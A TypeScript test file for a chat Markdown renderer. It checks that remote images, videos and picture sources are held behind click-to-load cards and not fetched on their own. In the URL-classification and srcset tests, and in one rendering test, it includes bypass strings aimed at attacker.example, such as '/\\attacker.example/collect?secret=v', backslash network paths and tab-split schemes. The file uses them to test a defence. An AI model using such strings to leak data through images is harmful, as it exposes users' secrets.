import { render as _fixtureRender, act } from "../../../test/render";

import { EnvironmentId, ThreadId } from "@t3tools/contracts";

import { describe, expect, it, vi } from "vite-plus/test";

const testState = vi.hoisted(() => ({
  assetState: "success" as "success" | "failure",
  resources: [] as Array<unknown>,
}));

vi.mock("~/state/server", async (original) => {
  const actual = await original<typeof import("~/state/server")>();
  return {
    ...actual,
    serverEnvironment: {
      ...actual.serverEnvironment,
      configValueAtom: () => "render-server-config",
    },
  };
});
vi.mock("@effect/atom-react", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@effect/atom-react")>();
  const { AsyncResult } = await import("effect/reactivity");
  return {
    ...actual,
    useAtomValue: (atom: unknown) =>
      atom === "render-server-config" ? null : AsyncResult.initial(),
    useAtomRefresh: () => vi.fn(),
  };
});
vi.mock("~/assets/assetUrls", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/assets/assetUrls")>()),
  useAssetUrlRefresh: () => vi.fn(),
  useAssetUrlState: (_environmentId: unknown, resource: unknown) => {
    testState.resources.push(resource);
    return testState.assetState === "failure"
      ? { _tag: "Failure" }
      : { _tag: "Success", url: "https://signed.test/asset.png" };
  },
}));
vi.mock("~/hooks/useTheme", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/hooks/useTheme")>()),
  useTheme: () => ({ resolvedTheme: "dark" }),
}));
vi.mock("~/state/use-atom-query-runner", () => ({ useAtomQueryRunner: () => vi.fn() }));
vi.mock("~/state/use-atom-command", () => ({ useAtomCommand: () => vi.fn() }));
vi.mock("~/state/session", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/state/session")>()),
  usePreparedConnection: () => ({ _tag: "None" }),
  useEnvironmentScope: () => false,
}));
vi.mock("~/state/entities", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/state/entities")>()),
  readThreadShell: () => null,
  useProjects: () => [],
  useServerConfigs: () => new Map(),
}));
vi.mock("~/remoteOpen", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/remoteOpen")>()),
  useRemoteOpenResolution: () => ({ state: { mode: "local-exec" }, isResolved: true }),
}));
vi.mock("~/editorPreferences", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/editorPreferences")>()),
  useOpenInPreferredEditor: () => vi.fn(),
  usePreferredEditor: () => [null, vi.fn()],
}));
vi.mock("~/lib/openPullRequestLink", async (importOriginal) => ({
  ...(await importOriginal<typeof import("~/lib/openPullRequestLink")>()),
  findProjectOnChangeRequestHost: () => undefined,
  parseChangeRequestUrl: () => null,
  resolvePullRequestPreviewTarget: () => null,
  useOpenChangeRequestLink: () => vi.fn(),
}));

import ChatMarkdown from "~/components/ChatMarkdown";

import { hasRemoteSrcSet, remoteImageAddress, srcSetCandidateUrls } from "./remoteImageAddress";

const threadRef = {
  environmentId: EnvironmentId.make("env-remote-images"),
  threadId: ThreadId.make("thread-remote-images"),
};

async function _setupFixture0(_fixture: _Fixture) {
  testState.assetState = "success";
  testState.resources = [];
}
async function _cleanupFixture1(_fixture: _Fixture) {
  for (const cleanup of _fixture.cleanups.splice(0)) await cleanup();
  _clearOwnedDOM(_fixture);
  vi.unstubAllGlobals();
}

async function mount(_fixture: _Fixture) {
  const images = holdNativeImages(_fixture);
  const host = document.createElement("div");
  document.body.append(_ownDOM(_fixture, host));
  const root = _fixture.stack.use(await _fixtureRender(null, { container: host, router: false }));
  _fixture.cleanups.push(async () => {
    await act(async () => await root.unmount());
  });
  const render = async (
    text: string,
    options: { isStreaming?: boolean; githubMedia?: boolean } = {},
  ) =>
    await act(
      async () =>
        await root.rerender(
          <ChatMarkdown
            cwd="/workspace/project"
            threadRef={threadRef}
            environmentId={threadRef.environmentId}
            text={text}
            parseRawHtml
            isStreaming={options.isStreaming ?? false}
            githubMedia={options.githubMedia ?? false}
          />,
        ),
    );
  return { host, render, images };
}

function nativeImageUrl(source: string) {
  const url = new URL("/test/fixtures/assets/0001.png", window.location.href);
  url.hash = source;
  return url.href;
}

function holdNativeImages(_fixture: _Fixture) {
  const requested = new WeakMap<HTMLImageElement, string>();
  const requests: string[] = [];
  const released = new Set<string>();
  const setAttribute = Element.prototype.setAttribute;
  const removeAttribute = Element.prototype.removeAttribute;
  const assign = (image: HTMLImageElement, source: string) => {
    requested.set(image, source);
    requests.push(source);
    if (released.has(source)) {
      image.loading = "eager";
      setAttribute.call(image, "src", nativeImageUrl(source));
    } else removeAttribute.call(image, "src");
  };
  // Localizing authored URLs would bypass permission classification. Hold the
  // native assignment instead, then publish only local fixture bytes on release.
  _fixture.stack.use(
    vi.spyOn(Element.prototype, "setAttribute").mockImplementation(function (
      this: Element,
      name: string,
      value: string,
    ) {
      if (this instanceof HTMLImageElement && name.toLowerCase() === "src") {
        assign(this, value);
        return;
      }
      if (
        (this instanceof HTMLImageElement || this instanceof HTMLSourceElement) &&
        name.toLowerCase() === "srcset" &&
        value !== "/test/fixtures/assets/0001.png 2x"
      )
        throw new Error("Unexpected native srcset in image fixture");
      setAttribute.call(this, name, value);
    }),
  );
  _fixture.stack.use(
    vi.spyOn(HTMLImageElement.prototype, "src", "set").mockImplementation(function (
      this: HTMLImageElement,
      value: string,
    ) {
      assign(this, value);
    }),
  );
  return {
    requested,
    requests,
    async release(host: HTMLElement, density: 1 | 2 = 1) {
      const pending = Array.from(host.querySelectorAll("img"));
      const expected = pending.map((image) => requested.get(image));
      expect(pending.length).toBeGreaterThan(0);
      await act(async () => {
        for (const image of pending) {
          const source = requested.get(image);
          if (source === undefined) throw new Error("Missing native image request");
          expect(image.getAttribute("src")).toBeNull();
          released.add(source);
          image.loading = "eager";
          setAttribute.call(image, "src", nativeImageUrl(source));
          await image.decode();
          expect(image.naturalWidth).toBe(16 / density);
          image.dispatchEvent(new Event("load"));
        }
      });
      await expect.poll(() => requestedImageSources({ requested }, host)).toEqual(expected);
      await expect
        .poll(() => Array.from(host.querySelectorAll("img"), (image) => image.naturalWidth))
        .toEqual(expected.map(() => 16 / density));
      for (const image of host.querySelectorAll("img")) {
        expect(image.getAttribute("src")).toBe(nativeImageUrl(requested.get(image)!));
      }
    },
  };
}

function requestedImageSources(
  images: { requested: WeakMap<HTMLImageElement, string> },
  host: HTMLElement,
): string[] {
  return Array.from(
    host.querySelectorAll("img"),
    (image) => images.requested.get(image) ?? image.getAttribute("src") ?? "",
  );
}

function remoteRequests(images: ReturnType<typeof holdNativeImages>, host: HTMLElement): string[] {
  const sources = Array.from(host.querySelectorAll("source"), (source) =>
    source.getAttribute("srcset"),
  );
  return [...images.requests, ...sources].filter(
    (value): value is string => value !== null && /^(?:https?:)?\/\//u.test(value),
  );
}

function loadButton(host: HTMLElement): HTMLButtonElement {
  const button = Array.from(host.querySelectorAll("button")).find((candidate) =>
    candidate.textContent?.startsWith("Load "),
  );
  if (!button) throw new Error("No load button");
  return button;
}

describe("web images in chat", () => {
  it("shows a remote Markdown image as a referenced link and fetches it only on request", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render("Result:\n\n![Tumour growth](https://images.example.org/lab/growth.png?run=7)");

    expect(remoteRequests(images, host)).toEqual([]);
    const card = host.querySelector<HTMLElement>('[role="group"]');
    expect(card?.getAttribute("aria-label")).toBe("Web image: Tumour growth");
    expect(card?.textContent).toContain("Tumour growth");
    expect(card?.textContent).toContain("images.example.org/lab/growth.png");
    expect(card?.getAttribute("data-markdown-copy")).toBe(
      "![Tumour growth](https://images.example.org/lab/growth.png?run=7)",
    );

    await act(() => loadButton(host).click());

    expect(host.querySelector('[role="group"]')).toBeNull();
    expect(requestedImageSources(images, host)).toEqual([
      "https://images.example.org/lab/growth.png?run=7",
    ]);
    expect(host.querySelector("img")?.getAttribute("alt")).toBe("Tumour growth");
    await images.release(host);
  });

  it("opens the address in the system browser through the ordinary external-link path", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render("![](https://images.example.org/a.png)");

    const link = host.querySelector<HTMLAnchorElement>('[role="group"] a');
    expect(link?.getAttribute("href")).toBe("https://images.example.org/a.png");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    link?.addEventListener("click", (event) => event.preventDefault(), { once: true });
    const notIntercepted = vi.fn((event: Event) => {
      // The desktop shell turns this `_blank` into openExternal; nothing in chat claims it.
      expect(event.defaultPrevented).toBe(false);
    });
    host.addEventListener("click", notIntercepted, { capture: true });
    link?.dispatchEvent(click);
    expect(notIntercepted).toHaveBeenCalledOnce();
    expect(remoteRequests(images, host)).toEqual([]);
  });

  it("names the card, its link, and its button for keyboard and screen-reader users", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render("![](https://images.example.org/figures/plot.svg)");

    const card = host.querySelector<HTMLElement>('[role="group"]')!;
    expect(card.getAttribute("aria-label")).toBe("Web image: Image");
    const focusable = Array.from(card.querySelectorAll<HTMLElement>("a[href], button"));
    expect(focusable.map((element) => element.tagName)).toEqual(["A", "BUTTON"]);
    expect(focusable[0]?.getAttribute("aria-label")).toBe(
      "Open images.example.org/figures/plot.svg in browser",
    );
    expect(focusable[1]?.getAttribute("aria-label")).toBe("Load image from images.example.org");
    expect(focusable[1]?.getAttribute("type")).toBe("button");

    focusable[1]!.focus();
    await act(() => focusable[1]!.click());

    // Focus follows the image instead of falling back to the page.
    expect(document.activeElement?.contains(host.querySelector("img"))).toBe(true);
    await images.release(host);
    expect(document.activeElement?.contains(host.querySelector("img"))).toBe(true);
  });

  it("gates raw HTML images, protocol-relative sources, and picture sources", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render(
      [
        '<img src="https://cdn.example.net/raw.png" alt="raw">',
        "",
        "![relative](//cdn.example.net/relative.png)",
        "",
        '<picture><source srcset="https://cdn.example.net/wide.webp 2x"><img src="https://cdn.example.net/narrow.png" alt="picture"></picture>',
      ].join("\n"),
    );

    expect(remoteRequests(images, host)).toEqual([]);
    expect(host.querySelectorAll("source")).toHaveLength(0);
    const labels = Array.from(host.querySelectorAll('[role="group"]'), (card) =>
      card.getAttribute("aria-label"),
    );
    expect(labels).toEqual(["Web image: raw", "Web image: relative", "Web image: picture"]);
    const relativeLink = host.querySelectorAll<HTMLAnchorElement>('[role="group"] a')[1];
    // Protocol-relative sources follow the page's own scheme, as chat always resolved them.
    expect(relativeLink?.getAttribute("href")).toBe(
      `${window.location.protocol}//cdn.example.net/relative.png`,
    );
  });

  it("drops a picture source that resolves to another server behind a same-origin image", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    const sameOrigin = `${window.location.origin}/test/fixtures/assets/0001.png#logo`;
    for (const srcset of [
      "/\\attacker.example/collect?secret=v",
      "\\\\attacker.example/collect",
      "/\\/attacker.example/collect",
      `/local.png 1x, HTTPS://attacker.example/collect 2x`,
    ]) {
      await render(
        `<picture><source srcset="${srcset}"><img src="${sameOrigin}" alt="logo"></picture>`,
      );

      expect(host.querySelectorAll("source")).toHaveLength(0);
      expect(host.querySelector('[role="group"]')).toBeNull();
      expect(requestedImageSources(images, host)).toEqual([sameOrigin]);
    }
    // A picture whose every candidate stays on the app keeps its source.
    await render(
      `<picture><source srcset="/test/fixtures/assets/0001.png 2x"><img src="${sameOrigin}" alt="logo"></picture>`,
    );
    expect(host.querySelector("source")?.getAttribute("srcset")).toBe(
      "/test/fixtures/assets/0001.png 2x",
    );
    await images.release(host, 2);
    expect(host.querySelector("img")?.currentSrc).toBe(
      new URL("/test/fixtures/assets/0001.png", window.location.href).href,
    );
  });

  it("gates remote videos written with image syntax", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render } = await mount(_fixture);
    await render("![Run](https://media.example.org/run.mp4)");

    expect(host.querySelector("video")).toBeNull();
    expect(host.querySelector('[role="group"]')?.getAttribute("aria-label")).toBe("Web video: Run");
    expect(loadButton(host).textContent).toBe("Load video");
  });

  it("leaves workspace images unchanged", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render("Plot ![plot](results/plot.png) inline");

    expect(host.querySelector('[role="group"]')).toBeNull();
    expect(requestedImageSources(images, host)).toEqual(["https://signed.test/asset.png"]);
    expect(testState.resources).toContainEqual(expect.objectContaining({ _tag: "workspace-file" }));
    await images.release(host);
  });

  it("gates an image inside a link while the surrounding link keeps working", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    await render("[![build](https://ci.example.org/badge.svg)](https://ci.example.org/runs/9)");

    expect(remoteRequests(images, host)).toEqual([]);
    const links = host.querySelectorAll("a");
    expect(links).toHaveLength(1);
    const link = links[0]!;
    expect(link.getAttribute("href")).toBe("https://ci.example.org/runs/9");
    const card = link.querySelector<HTMLElement>('[role="group"]');
    expect(card?.getAttribute("aria-label")).toBe("Web image: build");
    // The image address is shown as text: the link stays the only link.
    expect(card?.textContent).toContain("ci.example.org/badge.svg");

    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    await act(() => loadButton(host).dispatchEvent(click));

    // Loading the image does not follow the link, and the link now holds the image.
    expect(click.defaultPrevented).toBe(true);
    expect(host.querySelector("a")?.getAttribute("href")).toBe("https://ci.example.org/runs/9");
    expect(requestedImageSources(images, host)).toEqual(["https://ci.example.org/badge.svg"]);
    expect(images.requested.get(host.querySelector<HTMLImageElement>("a img")!)).toBe(
      "https://ci.example.org/badge.svg",
    );
    await images.release(host);
    expect(host.querySelector("a")?.getAttribute("href")).toBe("https://ci.example.org/runs/9");
  });

  it("keeps GitHub media on the authenticated proxy and never falls back to a direct fetch", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    const markdown = "![shot](https://github.com/user-attachments/assets/0123-abcd)";
    await render(markdown, { githubMedia: true });

    expect(host.querySelector('[role="group"]')).toBeNull();
    expect(requestedImageSources(images, host)).toEqual(["https://signed.test/asset.png"]);
    await images.release(host);

    testState.assetState = "failure";
    await render(`${markdown}\n`, { githubMedia: true });

    expect(remoteRequests(images, host).filter((src) => src.includes("github.com"))).toEqual([]);
    expect(host.querySelector('[role="group"]')?.getAttribute("aria-label")).toBe(
      "Web image: shot",
    );
    await act(() => loadButton(host).click());
    expect(requestedImageSources(images, host)).toEqual([
      "https://github.com/user-attachments/assets/0123-abcd",
    ]);
    await images.release(host);
  });

  it("keeps the card, and then the loaded image, stable while a message streams", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    const { host, render, images } = await mount(_fixture);
    const image = "![chart](https://images.example.org/chart.png)";
    await render(`Working on it.\n\n${image}\n\nStill`, { isStreaming: true });
    const card = host.querySelector('[role="group"]');
    expect(card).not.toBeNull();

    await render(`Working on it.\n\n${image}\n\nStill streaming the rest`, { isStreaming: true });
    expect(host.querySelector('[role="group"]')).toBe(card);
    expect(remoteRequests(images, host)).toEqual([]);

    await act(() => loadButton(host).click());
    const loaded = host.querySelector<HTMLImageElement>("img")!;
    expect(images.requested.get(loaded)).toBe("https://images.example.org/chart.png");
    expect(loaded.getAttribute("src")).toBeNull();

    await render(`Working on it.\n\n${image}\n\nStill streaming the rest, and more`, {
      isStreaming: true,
    });
    await render(`Working on it.\n\n${image}\n\nStill streaming the rest, and more.`);
    expect(host.querySelector('[role="group"]')).toBeNull();
    expect(host.querySelector("img")).toBe(loaded);
    await images.release(host);
    expect(host.querySelector('[role="group"]')).toBeNull();
    expect(requestedImageSources(images, host)).toEqual(["https://images.example.org/chart.png"]);
  });
});

const DESKTOP = { baseUrl: "scient://app/index.html", appUrl: "scient://app/index.html" };
const WEB = {
  baseUrl: "https://scient.example/threads/1",
  appUrl: "https://scient.example/threads/1",
};

describe("remoteImageAddress", () => {
  it("classifies web sources as remote and everything Scient serves as local", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    expect(remoteImageAddress("https://a.example/x/y.png?q=1", DESKTOP)).toEqual({
      url: "https://a.example/x/y.png?q=1",
      host: "a.example",
      label: "a.example/x/y.png",
    });
    expect(remoteImageAddress("http://127.0.0.1:4000/p.png", DESKTOP)?.host).toBe("127.0.0.1:4000");
    expect(remoteImageAddress("https://xn--e1afmkfd.example/p", DESKTOP)?.host).toBe(
      "xn--e1afmkfd.example",
    );
    for (const local of [
      "data:image/png;base64,AA==",
      "blob:https://a/1",
      "/logo.png",
      "logo.png",
      "https://scient.example/logo.png",
      "//scient.example/logo.png",
    ]) {
      expect(remoteImageAddress(local, WEB)).toBeNull();
    }
    // The desktop's private scheme is answered by its protocol handler, whatever the host.
    expect(remoteImageAddress("//cdn.example/logo.png", DESKTOP)).toBeNull();
    expect(remoteImageAddress("//cdn.example/logo.png", WEB)?.url).toBe(
      "https://cdn.example/logo.png",
    );
  });

  it.each([
    ["a backslash network path", "/\\attacker.example/collect?secret=v"],
    ["a double backslash", "\\\\attacker.example/collect"],
    ["mixed slashes", "/\\/attacker.example/collect"],
    ["a tab inside the scheme", "ht\ttps://attacker.example/collect"],
    ["a newline inside the scheme", "ht\ntps://attacker.example/collect"],
    ["an uppercase scheme", "HTTPS://ATTACKER.EXAMPLE/collect"],
  ])("resolves %s the way the browser does", async (_name, source) => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    expect(remoteImageAddress(source, WEB)?.host).toBe("attacker.example");
  });

  it("treats addresses the parser rejects, and non-web schemes, as remote", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    expect(remoteImageAddress("https://[bad", WEB)).toEqual({
      url: "https://[bad",
      host: "https://[bad",
      label: "https://[bad",
    });
    expect(remoteImageAddress("logo.png", { baseUrl: null, appUrl: null })).not.toBeNull();
    expect(remoteImageAddress("file://server/share/p.png", DESKTOP)).not.toBeNull();
  });
});

describe("srcset classification", () => {
  it("splits candidates by the HTML srcset rules", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    expect(srcSetCandidateUrls("a.png 1x, b.png 2x")).toEqual(["a.png", "b.png"]);
    // A comma inside a URL belongs to it; trailing commas end a URL without descriptors.
    expect(srcSetCandidateUrls("a.png,b.png")).toEqual(["a.png,b.png"]);
    expect(srcSetCandidateUrls("a.png,, b.png")).toEqual(["a.png", "b.png"]);
    expect(srcSetCandidateUrls("data:image/png;base64,AA== 1x,\n//x.example/c 2x")).toEqual([
      "data:image/png;base64,AA==",
      "//x.example/c",
    ]);
    // A comma inside parenthesised descriptors does not start a new candidate.
    expect(srcSetCandidateUrls("a.png 100w (x, y), b.png")).toEqual(["a.png", "b.png"]);
    expect(srcSetCandidateUrls(" , ")).toEqual([]);
  });

  it("flags a source when any candidate reaches another server", async () => {
    await using _fixture = _createFixture();
    _fixture.cleanup.defer(() => _cleanupFixture1(_fixture));
    await _setupFixture0(_fixture);

    expect(hasRemoteSrcSet("/a.png 1x, data:image/png;base64,AA== 2x", WEB)).toBe(false);
    expect(hasRemoteSrcSet("/a.png 1x, /\\attacker.example/c 2x", WEB)).toBe(true);
    // In srcset a tab is a separator: the browser requests the same-origin "ht", not the host.
    expect(srcSetCandidateUrls("ht\ttps://attacker.example/c")).toEqual(["ht"]);
    expect(hasRemoteSrcSet("ht\ttps://attacker.example/c", WEB)).toBe(false);
    expect(hasRemoteSrcSet("data:image/png;base64,AA== 1x,\n\\\\attacker.example/c", WEB)).toBe(
      true,
    );
    expect(hasRemoteSrcSet("/a.png 100w (x, https://attacker.example/c), b.png", WEB)).toBe(false);
    expect(hasRemoteSrcSet("/a.png 100w, HTTPS://attacker.example/c 200w", WEB)).toBe(true);
    expect(hasRemoteSrcSet(undefined, WEB)).toBe(false);
  });
});

function _createFixture() {
  const stack = new AsyncDisposableStack();
  const cleanup = new AsyncDisposableStack();
  return {
    cleanups: [] as Array<() => Promise<void>>,
    _ownedDOM: [] as Node[],

    stack,
    cleanup,
    async [Symbol.asyncDispose]() {
      try {
        await cleanup.disposeAsync();
      } finally {
        await stack.disposeAsync();
      }
    },
  };
}
type _Fixture = ReturnType<typeof _createFixture>;

function _ownDOM<T extends Node>(_fixture: _Fixture, node: T): T {
  _fixture._ownedDOM.push(node);
  _fixture.stack.defer(() => {
    node.parentNode?.removeChild(node);
  });
  return node;
}
function _clearOwnedDOM(_fixture: _Fixture) {
  for (const node of _fixture._ownedDOM.splice(0)) node.parentNode?.removeChild(node);
}
